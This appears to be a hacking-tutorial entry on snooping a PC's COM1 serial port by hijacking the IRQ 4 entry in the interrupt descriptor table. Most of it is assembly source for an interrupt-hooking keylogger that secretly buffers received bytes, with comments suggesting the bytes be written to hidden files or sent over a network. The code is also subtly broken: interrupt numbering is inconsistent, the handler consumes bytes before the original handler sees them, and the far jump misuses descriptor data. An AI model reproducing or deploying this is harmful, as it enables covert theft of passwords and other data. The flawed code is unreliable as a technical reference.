---

# Sample 2: Snooping on COM Port via IRQ Hijacking

**Category**: Hardware Hacking / Keylogging
**Relevance Period**: ~1980s - Early 2000s (True on bare metal, very tricky in VMs)

## Overview

Before HTTPS was everywhere and everything was encrypted, sensitive data like passwords often flew over serial lines (RS-232). Think old dial-up BBSes, industrial control systems (SCADA), or ancient point-of-sale systems. This sample is a throwback to when you could literally *listen* to a computer's thoughts by hijacking hardware interrupts.

The **16550 UART** (Universal Asynchronous Receiver-Transmitter) is the classic chip handling COM ports. When it receives a byte, it triggers an **IRQ** (Interrupt Request) - usually IRQ 3 for COM2 or IRQ 4 for COM1. The CPU stops what it's doing and jumps to the interrupt handler routine pointed to by the **Interrupt Descriptor Table (IDT)**.

The game plan:
1.  **Locate the IDT**: Find its base address.
2.  **Backup the Original Handler**: Save the original interrupt vector for IRQ 4 (COM1).
3.  **Install our Malicious Handler**: Overwrite the vector in the IDT to point to our code.
4.  **Mask the Interrupt?**: Sometimes you need to tell the PIC (Programmable Interrupt Controller) to not mask this IRQ.
5.  **The Handler**: In our code, read the byte from the UART's data register, log it somewhere secret, and then jump to the original handler so the OS and legitimate software still work. A true man-in-the-middle attack at the hardware level!

## The Code (Conceptual ASM)

```asm
BITS 32
section .text

; This code would need Ring 0 privileges to modify the IDT. Maybe combine it with Sample 1? ;)

global _install_com_snoop
_install_com_snoop:
    cli                         ; Disable interrupts! Don't want to be interrupted while hacking the interrupt table.
    sidt [idtr]                 ; Store IDT Register (gets base and limit of IDT)
    mov ebx, [idtr + 2]         ; EBX now points to the base of the IDT

    ; Calculate address of the IDT entry for IRQ 4 (which is mapped to INT 0x0C in protected mode)
    ; IRQn -> INT (0x20 + n). So IRQ4 is INT 0x24.
    mov eax, 0x24               ; Interrupt number
    mov ecx, 8                  ; Size of each IDT entry (8 bytes)
    mul ecx                     ; EAX = EAX * ECX -> offset into IDT
    add ebx, eax                ; EBX now points to the IDT entry for INT 0x24

    ; Save the original handler (it's a 32-bit offset + 16-bit selector)
    mov eax, [ebx]              ; Get low 32 bits of the descriptor (offset low 16 bits & selector)
    mov edx, [ebx + 4]          ; Get high 32 bits (offset high 16 bits + flags)
    mov [original_int24_handler], eax
    mov [original_int24_handler + 4], edx

    ; Install our new handler
    mov eax, our_snoop_handler
    mov word [ebx], ax          ; Set low 16 bits of offset
    shr eax, 16
    mov word [ebx + 6], ax      ; Set high 16 bits of offset
    ; The selector and flags in the descriptor remain mostly unchanged.

    sti                         ; Re-enable interrupts
    ret

; -------------------- OUR INTERRUPT HANDLER --------------------
our_snoop_handler:
    pushad                      ; Save all registers
    pushfd                      ; Save flags

    ; Check if the interrupt is actually from the COM port (Read the UART's IIR)
    mov dx, 0x3F8 + 2           ; Base port for COM1 (0x3F8) + Interrupt Identification Register (IIR)
    in al, dx
    test al, 1                  ; Check if interrupt pending bit is clear
    jnz .spurious_int           ; If set, no interrupt was pending? Spurious.

    ; Check if it's a "data received" interrupt (IIR value 0x04)
    and al, 0x06                ; Mask out the interrupt ID bits
    cmp al, 0x04                ; Is it a received data available interrupt?
    jne .not_our_data

    ; Read the received byte from the Receive Buffer Register (RBR)!
    mov dx, 0x3F8               ; COM1 base port (RBR)
    in al, dx                   ; AL now contains the byte typed on the other end!

    ; DO SOMETHING EVIL WITH THE BYTE!
    ; Store it in a buffer, write it to a hidden file, send it over the network.
    mov edi, [keybuffer_ptr]
    mov [edi], al
    inc edi
    mov [keybuffer_ptr], edi

.not_our_data:
.spurious_int:
    ; It's crucial to send an End-of-Interrupt (EOI) to the PIC.
    mov al, 0x20                ; EOI command
    out 0x20, al                ; Send EOI to master PIC

    popfd                       ; Restore flags
    popad                       ; Restore registers

    ; Jump to the original handler. This is a far jump using the saved descriptor.
    jmp far [original_int24_handler]

section .data
idtr:
    dw 0 ; Limit
    dd 0 ; Base
original_int24_handler:
    dd 0
    dd 0
keybuffer_ptr dd 0 ; Pointer to our secret buffer
```

## The Catch & Modern Relevance

*   **Legacy Hardware**: This is specific to physical COM ports and the old ISA bus. USB serial adapters abstract this away.
*   **Virtualization**: VMs virtualize hardware. Snooping on a *virtual* COM port from inside the guest is different and often impossible at this level.
*   **IOAPIC**: Modern systems use the more complex IOAPIC instead of the simple PIC, changing how interrupts are routed and acknowledged.

**Why learn this?** For CTFs involving hardware, embedded systems reverse engineering, or "old-school" hacking challenges. Understanding IRQs and hardware communication is fundamental.

## References & Further Reading

1.  **[OSDev Wiki: Interrupts](https://wiki.osdev.org/Interrupts)**
2.  **[OSDev Wiki: PIC](https://wiki.osdev.org/PIC)**
3.  **[16550 UART Datasheet](https://web.archive.org/web/20220121024810/http://www.classiccmp.org/pipermail/cctech/2015-January/029252.html)** - The hardware bible for this.
4.  **"The Art of Assembly Language" by Randall Hyde** - Covers hardware interaction in great detail.
